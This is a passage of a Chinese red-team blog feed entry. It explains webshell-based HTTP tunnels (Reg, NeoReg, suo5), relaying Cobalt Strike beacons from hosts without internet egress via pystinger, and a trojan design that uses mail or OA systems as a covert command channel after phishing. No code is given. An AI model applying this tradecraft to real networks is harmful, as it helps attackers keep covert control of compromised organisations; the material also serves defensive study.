    <updated>2024-07-22T08:44:45.466Z</updated>
    
    <content type="html"><![CDATA[<p>先简单带一下常见的正向HTTP隧道</p><h2 id="0x01正向http隧道"><a class="markdownIt-Anchor" href="#0x01正向http隧道"></a> 0x01正向HTTP隧道</h2><p>这种方式应用范围很广，有webshell的情况下都支持此方式</p><h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><p>页面上存在成熟的工具Reg、NeoReg、suo5等</p><p>原理大概如下图所示：（这里直接拿Viper作者的图来说了）</p><p><img src="../../../typora-user-images/image-20240709180051975.png" alt="image-20240709180051975" /></p><ul><li><p>client运行在互联网的vps上，开启端口监听处理proxychains转发的tcp连接。（client对应的就是reg的本地python脚本和suo5的客户端）</p></li><li><p>clinet从tcp连接中读取数据，将数据存储在post请求中发送到webshell。</p></li><li><p>webshell将http请求解析并进行转发。（webshell集成了上图中的server)</p></li></ul><p>suo5其实实现了基本全双工的模式，这个问题后面有空再研究。</p><h2 id="0x02不出网上线cs场景"><a class="markdownIt-Anchor" href="#0x02不出网上线cs场景"></a> 0x02不出网上线CS场景</h2><p>CS的beacon只能反向连接，不出网的情况下无法直接反向连接外网vps</p><p>其实也可以利用中转的方式进行上线</p><h3 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h3><p>成熟的工具：pystinger（毒刺）</p><p>原理大概如下图所示：（这里直接拿Viper作者的图来说了）</p><p><img src="../../../typora-user-images/image-20240709180109508.png" alt="image-20240709180109508" /></p><p>server端：</p><ul><li>beacon将http请求(假设数据为AAAAAA)发送到server。</li><li>server将(AAAAAA)存储到缓存，并保持与beacon的http连接。</li></ul><p>client端：</p><ul><li>请求webshell。</li><li>webshell转发请求到server。</li><li>server将缓存的(AAAAA)填充到http应答中。</li><li>webshell将server的应答转发给client。</li><li>client从应答中获取数据(AAAAA)。</li><li>client与cobaltstike的listener建立tcp连接。</li><li>client发送(AAAAA)到cobaltstrike的listener。</li><li>conbaltstrike发送应答数据(BBBBBB)。</li><li>client将数据(BBBBB)封装到http请求中,通过webshell转发到server。</li><li>server通过之前保持的http连接将(BBBBBB)发送到beacon。</li></ul><p>实际的流程就是数据包的转换和转发，理解完上面的正向，反向的逻辑只是增加了一个监听而已。</p><p>可能会有人有这样的问题：<strong>这里的webshell可以类似reg把server也整合一下吗，不落地server？</strong></p><p>答案是不行的，区别于正向连接，反向连接时需要监听端口，webshell是无法做到的，所以使用毒刺的时候，不出网的机器需要落地两个文件（webshell、server）</p><h2 id="0x03实战钓鱼不出网上线"><a class="markdownIt-Anchor" href="#0x03实战钓鱼不出网上线"></a> 0x03实战钓鱼不出网上线</h2><p>根据上面的不出网上线cs案例解释，其实主要做的就是流量转发和格式化</p><p>格式化的部分就是毒刺的client和server在做，但是这样会在webshell的机器上落地sever的二进制文件，同时需要开启监听，不够opsec。</p><p>不妨把思路发散一下：有没有可能把server和c2马绑在一起呢？或者换句话说，我们可以重新写我们的c2马，直接把结果写入到webshell缓存中，c2的控制端会请求webshell获取缓存读取结果，就完成了不出网的上线流程。</p><p>这个案例其实之前项目遇见过：</p><p><strong>钓鱼的时候，机器不出网如何上线？？</strong></p><p>找内外网可能互通的业务：邮件系统、OA系统等（可能需要账号，但是这些系统大概率内外网是互通的），或者直接摆烂，找能做数据交互的系统域名，批量都试一下。</p><p>对应我们上面的思路，重新设计我们的c2马和服务端，或者没那么麻烦，自己写一个能执行命令、文件上传和读取的马就可以了。</p><p>木马：</p><ul><li><p>定时读取邮件、OA系统或者其他能存储数据的系统的数据。（如邮件内容，系统编辑内容、oa聊天记录等等），作为命令输入。</p></li><li><p>获取命令输入后将执行结果写入对应系统。</p></li></ul><p>因为内外网系统互通</p><p>c2控制端：</p><ul><li>将想执行的命令写入到外网系统，供木马读取</li><li>将木马执行结果读取并响应</li></ul><p>实战应用的话，其实还是可以用的。</p><p>机器不出网的话，肯定会配内部dns，所以去外网找可以存储数据的系统域名，写木马的时候加上批量的逻辑if else尝试所有可能的域名，保证稳定获取结果就可以了。</p><p>参考连接：</p><p>（红队攻防实践：不出网主机搭建内网隧道新思路）<a href="https://mp.weixin.qq.com/s/WzXztQoiqBec-y23dRj0ww">https://mp.weixin.qq.com/s/WzXztQoiqBec-y23dRj0ww</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先简单带一下常见的正向HTTP隧道&lt;/p&gt;
&lt;h2 id=&quot;0x01正向http隧道&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01正向http隧道&quot;&gt;&lt;/a&gt; 0x01正向HTTP隧道&lt;/h2&gt;
&lt;p&gt;这种方式应用范围很广，有websh</summary>
      
    
    
    
    
    <category term="不出网利用" scheme="https://cyxsec.github.io/tags/%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
</feed>
